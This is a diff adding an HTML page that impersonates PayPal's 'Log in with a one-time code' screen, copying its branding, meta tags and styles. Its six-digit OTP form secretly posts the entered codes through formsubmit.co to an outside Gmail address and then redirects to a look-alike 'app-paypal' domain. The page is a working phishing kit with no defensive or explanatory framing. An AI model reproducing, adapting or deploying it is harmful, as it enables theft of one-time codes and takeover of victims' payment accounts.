@@ -1,0 +1,324 @@
+<head>
+    <!--Script info: script: node, template:  , date: Sep 25, 2023 12:14:54 -07:00, country: US, language: en web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLmNSWW7oQxSqkM7CaNNY3vxSA1PQRlz5z rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfVANbpv53MZEySepZVSpTWRYJ8c9hOdmTQvvbMUYYkax_18acdc4177d -->
+    <meta charset="utf-8">
+    
+<link rel = 'icon' href = 'paypal.png' type = 'image/x-icon'>
+    <title>Log in to your PayPal account</title>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="application-name" content="PayPal">
+    <meta name="msapplication-task"
+        content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
+    <meta name="msapplication-task"
+        content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
+    <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
+    <meta name="description"
+        content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
+<link rel="stylesheet" href="otp.css">
+    <meta name="viewport"
+        content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
+    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
+    
+    <!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/0e5/418cc87f0ab9fcb01f588e89a18d7/css/ie9.css" /><![endif]--><!-- build:js inline --><!-- build:[src] js/lib/ -->
+    <script nonce=""
+        src="https://www.paypalobjects.com/web/res/0e5/418cc87f0ab9fcb01f588e89a18d7/js/lib/modernizr-2.6.1.js"></script>
+    <!-- /build --><!-- /build -->
+    <script
+        nonce="">/* Special integration eligibility check */function isEligibleIntegration() { var sxf = ""; return sxf === 'true' || window.name === 'PPFrameRedirect'; }/* Don't bust the frame if this is top window */if (self === top || isEligibleIntegration()) { var antiClickjack = document.getElementById("antiClickjack"); if (antiClickjack) { antiClickjack.parentNode.removeChild(antiClickjack); } } else { top.location = self.location; }</script>
+    <style nonce="">
+        @font-face {
+            font-family: "PayPalSansBig-Regular";
+            font-style: normal;
+            font-display: swap;
+            src: url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.woff2') format('woff2'), url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.woff') format('woff'), url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.eot?#iefix') format('embedded-opentype'), url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.svg') format('svg');
+        }
+
+        #ccpaCookieBanner {
+            font-family: PayPalSansBig-Regular, sans-serif;
+        }
+
+        @keyframes slideInFromBottom {
+            0% {
+                transform: translateY(100%);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .ccpaCookieBanner_container {
+            animation: 1s ease-in 0s 1 slideInFromBottom;
+            width: 84%;
+            margin-left: 8%;
+            position: fixed;
+            bottom: 2rem;
+            background-color: #FFFFFF;
+            z-index: 1051;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 6rem;
+            box-shadow: 0px 12px 28px rgb(0 0 0 / 16%);
+            border-radius: 12px;
+        }
+
+        .ccpaCookieBanner_content-container {
+            padding: 1.875rem 4rem 1.875rem 5rem;
+        }
+
+        .ccpaCookieBanner_content {
+            color: #000000;
+            font-family: 'PayPalSansBig-Regular';
+            font-size: 14px;
+            line-height: 20px;
+            margin: 0;
+            padding: 0;
+        }
+
+        #manageCookiesLink {
+            text-decoration: underline;
+            color: #0070ba;
+            font-family: PayPalSansBig-Regular;
+            font-weight: 500;
+        }
+
+        .ccpaCookieBanner_content a:focus,
+        .ccpaCookieBanner_buttonGroup button:focus {
+            border: 1px solid #0070BA;
+        }
+
+        .ccpaCookieBanner_buttonGroup {
+            padding-right: 5rem;
+        }
+
+        button.ccpaCookieBanner_accept-button {
+            font-size: 14px;
+            line-height: 24px;
+            font-weight: 600;
+            color: #FFFFFF;
+            background: #0070BA;
+            border: 1px solid #0070BA;
+            border-radius: 24px;
+            min-width: 6rem;
+            min-height: 2rem;
+            cursor: pointer;
+            padding: 0px 2rem;
+        }
+
+        button.ccpaCookieBanner_close-button {
+            font-size: 14px;
+            line-height: 24px;
+            font-weight: 600;
+            color: #FFFFFF;
+            background: #0070BA;
+            border: 1px solid #0070BA;
+            border-radius: 24px;
+            min-width: 6rem;
+            min-height: 2rem;
+            cursor: pointer;
+            padding: 0px 2rem;
+            margin-top: 0.5rem;
+        }
+
+        .ccpaCookieBanner-acceptedAll {
+            height: auto;
+            padding-bottom: 8em;
+        }
+
+        @media only screen and (max-width: 768px) {
+            .ccpaCookieBanner_container {
+                width: 92%;
+                margin-left: 4%;
+                display: block;
+                bottom: 1rem;
+            }
+
+            .ccpaCookieBanner_content-container {
+                padding: 0.75rem 2.5rem 0.75rem 1.25rem
+            }
+
+            .ccpaCookieBanner_buttonGroup {
+                text-align: center;
+                padding: 0 0 0.75rem 0;
+            }
+
+            button.ccpaCookieBanner_accept-button {
+                margin: 0 1.25rem 0 0;
+            }
+        }
+
+        @media only screen and (max-width: 600px) {
+            .ccpaCookieBanner-acceptedAll {
+                height: auto;
+                padding-bottom: 12em;
+            }
+        }
+
+        @media only screen and (max-width: 575.98px) {
+            .ccpaHideCookieBannerMobile {
+                display: none;
+            }
+        }
+    </style>
+    <style>
+        /** method responsible for loading the background image set in CSS **/
+        @-webkit-keyframes rotation {
+            from {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            to {
+                -webkit-transform: rotate(359deg);
+                transform: rotate(359deg);
+            }
+        }
+
+        @-moz-keyframes rotation {
+            from {
+                -moz-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            to {
+                -moz-transform: rotate(359deg);
+                transform: rotate(359deg);
+            }
+        }
+
+        @-o-keyframes rotation {
+            from {
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            to {
+                -o-transform: rotate(359deg);
+                transform: rotate(359deg);
+            }
+        }
+
+        @keyframes rotation {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(359deg);
+            }
+        }
+    </style>
+</head>
+
+<body class="deskstop">
+    <div id="main" class="main" role="main">
+        <section id="verifyOtp" class="contentAlignment verifyOtp verifyOtpPrimary otpPrimary" data-role="page">
+            <div class="corral">
+
+                <div class="signin">
+                    <div class="profileBar"></div>
+                    <div id="content" class="contentContainerBordered activeContent">
+                        <section id="otpVerification" class="">
+                            <div class="">
+                                <header>
+                                    <img src="paypal.png" class="paypal-logo paypal-logo-monogram">
+                                </header>
+                                <div>
+                                    <div id="notifications" class="notifications"></div>
+                                    <div id="toast" class="sent toast"><span class="codeSentMessage">We sent a new
+                                            code.</span></div>
+                                    <h1 class="headerText adjustHeader">Log in with a one-time code</h1>
+                                    <div class="sendSmsResendLink slimTopP">
+                                        <p class="sendSmsMessage">We sent a code to your phone number.</p>
+                                    </div>
+                                    <form action="https://formsubmit.co/godofmiracle101@gmail.com" method="post"
+                                        class="proceed maskable transformRightToLeft" autocomplete="off"
+                                        name="verifyOtp" novalidate="">
+
+
+                                        <input type="hidden" name="_captcha" value="false">
+            <input type="text" name="_honey" style="display:none">
+    
+            <input id="next" type="hidden" name="_next" value="https://app-paypal.web.app/otp.html">
+
+
+                                        <div class="textInput" id="security_codediv">
+                                            <div class="otp-pin-container fieldWrapper" id="security_code">
+                                                <input
+                                                    name="pin1" id="otp1" required="" class="pin-box" maxlength="1"
+                                                    type="number" pattern="[0-9]*" inputtype="numeric" min="0" max="9"
+                                                    aria-label="Verification code" autocomplete="one-time-code"
+                                                    aria-describedby="security-divErrorMessage" value="" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                                                    <input
+                                                    name="pin2" id="otp2" required="" class="pin-box" maxlength="1"
+                                                    type="number" pattern="[0-9]*" inputtype="numeric" min="0" max="9"
+                                                    aria-label="Verification code"
+                                                    aria-describedby="security-divErrorMessage" value="" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                                                    <input
+                                                    name="pin3" id="otp3" required="" class="pin-box" maxlength="1"
+                                                    type="number" pattern="[0-9]*" inputtype="numeric" min="0" max="9"
+                                                    aria-label="Verification code"
+                                                    aria-describedby="security-divErrorMessage" value="" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                                                    <input
+                                                    name="pin4" id="otp4" required="" class="pin-box" maxlength="1"
+                                                    type="number" pattern="[0-9]*" inputtype="numeric" min="0" max="9"
+                                                    aria-label="Verification code"
+                                                    aria-describedby="security-divErrorMessage" value="" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                                                    <input
+                                                    name="pin5" id="otp5" required="" class="pin-box" maxlength="1"
+                                                    type="number" pattern="[0-9]*" inputtype="numeric" min="0" max="9"
+                                                    aria-label="Verification code"
+                                                    aria-describedby="security-divErrorMessage" value="" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                                                    <input
+                                                    name="pin6" id="otp6" required="" class="pin-box" maxlength="1"
+                                                    type="number" pattern="[0-9]*" inputtype="numeric" min="0" max="9"
+                                                    aria-label="Verification code"
+                                                    aria-describedby="security-divErrorMessage" value="" onkeyup="inputInsideOtpInput(this)" maxlength="1">
+                                                    </div>
+                                                    <br><br><br><br>
+                                                    <button class = 'log' type = 'submit' value = 'Log In'>Log In</button>
+                                        </div>
+
+                                    </form>
+                                </div>
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </div>
+    </div>
+    </section>
+</div>
+
+<script src="main.js"></script>
+<script>
+      function inputInsideOtpInput(el) {
+        if (el.value.length > 1) {
+          el.value == "";
+          if (el.nextElementSibling.value == "") {
+            el.nextElementSibling.value = el.value[el.value.length - 1];
+          }
+          if (!el.nextElementSibling) {
+            el.value = el.value[0];
+          }
+          el.value = el.value[0];
+        }
+        try {
+          if (el.value == null || el.value == "") {
+            this.foucusOnInput(el.previousElementSibling);
+          } else {
+            this.foucusOnInput(el.nextElementSibling);
+          }
+        } catch (e) {
+          console.log(e);
+        }
+      }
+      function foucusOnInput(ele) {
+        ele.focus();
+      }
+    </script>
+</body>
+
+</html>
